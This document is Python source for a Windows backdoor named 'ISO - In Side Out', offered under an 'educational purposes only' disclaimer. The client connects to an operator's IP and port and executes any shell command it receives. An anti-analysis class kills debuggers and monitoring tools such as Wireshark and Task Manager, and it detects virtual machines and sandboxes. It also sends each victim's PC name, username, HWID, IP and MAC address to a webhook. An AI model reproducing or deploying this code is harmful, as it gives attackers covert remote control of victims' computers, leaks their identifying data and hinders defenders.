'''

            ISO - In Side Out
            
        created by CookiesKush420
           github.com/Callumgm
       
       
    This a highly sophisticated backdoor that can be
    used to gain access to a target machine and execute terminal commands.
    
    CREATED FOR EDUCATIONAL PURPOSES ONLY.
     
'''

### System Modules ###
import os
import re
import sys
import wmi
import uuid
import socket
import psutil
import ctypes
import shutil
import signal
import platform
import win32api
import requests
import subprocess
import win32process

from datetime import datetime
from threading import Thread
from typing import Tuple
from time import sleep
from ctypes import *


IP   = "IP_HERE"
PORT = int("PORT_HERE")

class AntiDebug():

    def __init__(self):
        self.api                = "URL_HERE"
        self.vmcheck_switch     = True
        self.vtdetect_switch    = True
        self.listcheck_switch   = True
        self.anti_debug_switch  = True

        #region Infomation
        try: self.ip = requests.get("https://api.ipify.org").text
        except: self.ip = "None"
        self.serveruser = os.getenv("UserName")
        self.pc_name = os.getenv("COMPUTERNAME")
        self.mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        self.computer = wmi.WMI()
        self.os_info = self.computer.Win32_OperatingSystem()[0]
        self.os_name = self.os_info.Name.encode('utf-8').split(b'|')[0]
        self.gpu = self.computer.Win32_VideoController()[0].Name
        self.currentplat = self.os_name
        self.hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
        self.hwidlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt')
        self.pcnamelist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt')
        self.pcusernamelist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt')
        self.iplist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt')
        self.maclist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt')
        self.gpulist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/gpu_list.txt')
        self.platformlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_platforms.txt')
        #endregion

        self.sandboxDLLs = ["sbiedll.dll","api_log.dll","dir_watch.dll","pstorec.dll","vmcheck.dll","wpespy.dll"]
        self.program_blacklist = [
            "httpdebuggerui.exe", 
            "wireshark.exe", 
            "HTTPDebuggerSvc.exe", 
            "fiddler.exe", 
            "regedit.exe", 
            "taskmgr.exe", 
            "vboxservice.exe", 
            "df5serv.exe", 
            "processhacker.exe", 
            "vboxtray.exe", 
            "vmtoolsd.exe", 
            "vmwaretray.exe", 
            "ida64.exe", 
            "ollydbg.exe",
            "pestudio.exe", 
            "vmwareuser", 
            "vgauthservice.exe", 
            "vmacthlp.exe", 
            "x96dbg.exe", 
            "vmsrvc.exe", 
            "x32dbg.exe", 
            "vmusrvc.exe", 
            "prl_cc.exe", 
            "prl_tools.exe", 
            "xenservice.exe", 
            "qemu-ga.exe", 
            "joeboxcontrol.exe", 
            "ksdumperclient.exe", 
            "ksdumper.exe",
            "joeboxserver.exe"
        ]

    #region Functions
    def post_message(self, msg):
        requests.post(self.api, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'}, data={"content": f"{msg}"})

    def anti_debug(self):
        '''
        Will attempt to close any running debuggers then exit the program.
        comment out 'os._exit(1)' to make the program not exit on debugger detection.
        '''
        while True:
            try:
                sleep(0.7)
                for proc in psutil.process_iter():
                    if any(procstr in proc.name().lower() for procstr in self.program_blacklist):
                        try:
                            self.post_message(f"Anti-Debug Program: {proc.name()} was detected running on the system. Closing program...") ; proc.kill()
                            os._exit(1)
                        except(psutil.NoSuchProcess, psutil.AccessDenied): pass
            except: pass

    def block_dlls(self):
        while True:
            try:
                sleep(1)
                EvidenceOfSandbox = []
                allPids = win32process.EnumProcesses()
                for pid in allPids:
                    try:
                        hProcess = win32api.OpenProcess(0x0410, 0, pid)
                        try:
                            curProcessDLLs = win32process.EnumProcessModules(hProcess)
                            for dll in curProcessDLLs:
                                dllName = str(win32process.GetModuleFileNameEx(hProcess, dll)).lower()
                                for sandboxDLL in self.sandboxDLLs:
                                    if sandboxDLL in dllName:
                                        if dllName not in EvidenceOfSandbox: EvidenceOfSandbox.append(dllName)
                        finally:
                                win32api.CloseHandle(hProcess)
                    except: pass
                if EvidenceOfSandbox:
                    requests.post(f'{self.api}',json={'content': f"""```yaml
        The following sandbox-indicative DLLs were discovered loaded in processes running on the system. Do not proceed.
        Dlls: {EvidenceOfSandbox}
        ```"""}) ; os._exit(1)
            except: pass
    
    def ram_check(self):
        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [
                ("dwLength", ctypes.c_ulong),
                ("dwMemoryLoad", ctypes.c_ulong),
                ("ullTotalPhys", ctypes.c_ulonglong),
                ("ullAvailPhys", ctypes.c_ulonglong),
                ("ullTotalPageFile", ctypes.c_ulonglong),
                ("ullAvailPageFile", ctypes.c_ulonglong),
                ("ullTotalVirtual", ctypes.c_ulonglong),
                ("ullAvailVirtual", ctypes.c_ulonglong),
                ("sullAvailExtendedVirtual", ctypes.c_ulonglong),
            ]

        memoryStatus = MEMORYSTATUSEX()
        memoryStatus.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
        ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(memoryStatus))

        if memoryStatus.ullTotalPhys/1073741824 < 1:
            requests.post(f'{self.api}',json={'content': f"""```yaml
    Ram Check: Less than 4 GB of RAM exists on this system. Exiting program...
    ```"""}) ; os._exit(1)

    def is_debugger(self):
        isDebuggerPresent = windll.kernel32.IsDebuggerPresent()

        if (isDebuggerPresent):
            requests.post(f'{self.api}',json={'content': f"""```yaml
    IsDebuggerPresent: A debugger is present, exiting program...
    ```"""}) ; os._exit(1)

        if ctypes.windll.kernel32.CheckRemoteDebuggerPresent(ctypes.windll.kernel32.GetCurrentProcess(), False) != 0:
            requests.post(f'{self.api}',json={'content': f"""```yaml
    CheckRemoteDebuggerPresent: A debugger is present, exiting program...
    ```"""}) ; os._exit(1)

    def disk_check(self):
        minDiskSizeGB = 50
        if len(sys.argv) > 1: minDiskSizeGB = float(sys.argv[1])
        _, diskSizeBytes, _ = win32api.GetDiskFreeSpaceEx()
        diskSizeGB = diskSizeBytes/1073741824

        if diskSizeGB < minDiskSizeGB:
            requests.post(f'{self.api}',json={'content': f"""```yaml
    Disk Check: The disk size of this host is {diskSizeGB} GB, which is less than the minimum {minDiskSizeGB} GB. Exiting program...
    ```"""}) ; os._exit(1)

    def vtdetect(self):
        requests.post(self.api, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'}, data={"content": f"""```yaml
    ![PC DETECTED]!  
    PC Name: {self.pc_name}
    PC Username: {self.serveruser}
    HWID: {self.hwid}
    IP: {self.ip}
    MAC: {self.mac}
    PLATFORM: {self.os_name}
    CPU: {self.computer.Win32_Processor()[0].Name}
    RAM: {str(round(psutil.virtual_memory().total / (1024.0 **3)))} GB
    GPU: {self.gpu}
    TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}```"""})

    def vmcheck(self):
        def get_base_prefix_compat(): # define all of the checks
            return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix

        def in_virtualenv(): 
            return get_base_prefix_compat() != sys.prefix

        if in_virtualenv(): # If vm is detected
            self.post_message("**VM DETECTED, EXITING PROGRAM...**") ; os._exit(1)
        
        def registry_check():  #VM REGISTRY CHECK SYSTEM [BETA]
            reg1 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
            reg2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")       
            
            if reg1 != 1 and reg2 != 1:
                self.post_message("VMware Registry Detected") ; os._exit(1)

        def processes_and_files_check():
            vmware_dll      = os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
            virtualbox_dll  = os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")   

            process         = os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
            processList     = []

            for processNames in process.split(" "):
                if ".exe" in processNames: processList.append(processNames.replace("K\n", "").replace("\n", ""))

            if "VMwareService.exe" in processList or "VMwareTray.exe" in processList: 
                self.post_message("VMwareService.exe & VMwareTray.exe process are running") ; os._exit(1)
                            
            if os.path.exists(vmware_dll): 
                self.post_message("**Vmware DLL Detected**") ; os._exit(1)
                
            if os.path.exists(virtualbox_dll): 
                self.post_message("**VirtualBox DLL Detected**") ; os._exit(1)   

        def mac_check():
            mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
            vmware_mac_list = ["00:05:69", "00:0c:29", "00:1c:14", "00:50:56"]
            if mac_address[:8] in vmware_mac_list: self.post_message("**VMware MAC Address Detected**") ; os._exit(1)

        registry_check(), processes_and_files_check(), mac_check()
        self.post_message("[+] VM Not Detected") 

    def listcheck(self):
        try:
            if self.hwid in self.hwidlist.text:
                self.post_message(f"**Blacklisted HWID Detected. HWID:** `{self.hwid}`")
                sleep(2) ; os._exit(1)
        except:
            self.post_message('[ERROR]: Failed to connect to database.')
            sleep(2) ; os._exit(1)

        try:
            if self.serveruser in self.pcusernamelist.text:
                self.post_message(f"**Blacklisted PC User:** `{self.serveruser}`")
                sleep(2) ; os._exit(1)
        except:
            self.post_message('[ERROR]: Failed to connect to database.')
            sleep(2) ; os._exit(1)

        try:
            if self.pc_name in self.pcnamelist.text:
                self.post_message(f"**Blacklisted PC Name:** `{self.pc_name}`")
                sleep(2) ; os._exit(1)
        except:
            self.post_message('[ERROR]: Failed to connect to database.')
            sleep(2) ; os._exit(1)

        try:
            if self.ip in self.iplist.text:
                self.post_message(f"**Blacklisted IP:** `{self.ip}`")
                sleep(2) ; os._exit(1)
        except:
            self.post_message('[ERROR]: Failed to connect to database.')
            sleep(2) ; os._exit(1)

        try:
            if self.mac in self.maclist.text:
                self.post_message(f"**Blacklisted MAC:** `{self.mac}`")
                sleep(2) ; os._exit(1)
        except:
            self.post_message('[ERROR]: Failed to connect to database.')
            sleep(2) ; os._exit(1)

        try:
            if self.gpu in self.gpulist.text:        
                self.post_message(f"**Blacklisted GPU:** `{self.gpu}`")
                sleep(2) ; os._exit(1)
        except:
            self.post_message('[ERROR]: Failed to connect to database.')
            sleep(2) ; os._exit(1)
    #endregion

    def start(self):
        self.is_debugger(), self.disk_check(), self.ram_check() # Run all checks
        if self.anti_debug_switch:
            Thread(name='Anti-Debug', target=self.anti_debug).start()
            Thread(name='Anti-DLL', target=self.block_dlls).start()
        
        if self.vtdetect_switch:     self.vtdetect()      # VTDETECT
        if self.vmcheck_switch:      self.vmcheck()       # VMCHECK
        if self.listcheck_switch:    self.listcheck()     # LISTCHECK


class Client():
    #region Client Functions
    def __init__(self, connect:Tuple[str,int]=(IP, PORT)) -> None:
        signal.signal(signal.SIGINT, self.exit_gracefully)
        signal.signal(signal.SIGTERM, self.exit_gracefully)

        self.bot_name   = str(os.getlogin()).lower()                    # Get bot name
        self.temp       = os.getenv('temp')                             # Get temp directory
        self.is_admin   = ctypes.windll.shell32.IsUserAnAdmin() != 0    # Check if user is admin
        self.public_ip  = self.getip()                                  # Get public IP address
        self.system     = platform.uname()                              # Get system info

        self.stop = False
        self.run  = False

        while not self.stop:
            try: self._connect(connect)
            except KeyboardInterrupt: continue
            except: sleep(1)

    def exit_gracefully(self, signum, frame):
        self.stop = True
        self.run = False
        self.sock.close()
        sleep(1)
        os._exit(1)

    def _connect(self, connect:Tuple[str,int]) -> None:
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect(connect)      # Connect to the server
        self.start()                    # Start client

    def _recv(self):
        rec = self.sock.recv(1024).decode("ascii")

        if rec[4:] == "root":
            return rec

        else: return rec.lower()
    #endregion

    def getip(self):
        ''' Get public IP address '''
        try: ip = requests.get("https://api.ipify.org").text
        except: ip = "None"
        return ip

    def _shell_run(self, commands):
        ''' Run shell commands '''
        subproces = subprocess.Popen(commands, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output    = subproces.stderr.read() + subproces.stdout.read()

        if len(output) == 0: output = b"No Output"
        self.sock.send(output)

    def start(self):
        while True:
            data = self._recv()
            
            if "root" in data:
                try:
                    data = data.replace("root ","")
                    commands = str(data)

                    self._shell_run(commands)
                except Exception as e: self.sock.send(f"\n\nError:\n\n{e}\n\n========================================================================\n\n".encode("ascii"))

            elif "admincheck" in data:
                try: self.sock.send(str.encode("Admin privileges")) if self.is_admin == True else self.sock.send(str.encode("NO Admin privileges"))
                except Exception as e: self.sock.send(f"\n\nError:\n\n{e}\n\n========================================================================\n\n".encode("ascii"))

            elif data == "kill":
                self.sock.send(str.encode("Client Killed"))
                self.sock.close()
                self.exit_gracefully(0,0)

            elif data == "getip":
                try: self.sock.send(str.encode(f"{self.public_ip}    \t{self.system.system}"))
                except Exception as e: self.sock.send(f"\n\nError:\n\n{e}\n\n========================================================================\n\n".encode("ascii"))

            elif data == "sysinfo":
                try: 
                    total, used, free = shutil.disk_usage("/")

                    data = f"""
    ------------------- Main Info -------------------
            Username:   \t{self.bot_name}
            Admin:      \t{self.is_admin}
            Public IP:  \t{self.public_ip}

    ------------------- Disk Info -------------------
            Total:      \t{total // (2**30)} GB
            Used:       \t{used // (2**30)} GB
            Free:       \t{free // (2**30)} GB

    ------------------- System Info -------------------
            System:     \t{self.system.system}
            Node Name:  \t{self.system.node}
            Release:    \t{self.system.release}
            Version:    \t{self.system.version}
            Machine:    \t{self.system.machine}
            Processor:  \t{self.system.processor}
                    """
                    self.sock.send(str.encode(data))
                except Exception as e: self.sock.send(f"\n\nError:\n\n{e}\n\n========================================================================\n\n".encode("ascii"))
 
            else: self.sock.send(str.encode("Invalid Command"))


if __name__ == "__main__":
    try: requests.get('https://google.com')
    except: os._exit(1)

    AntiDebug().start()
    Client()
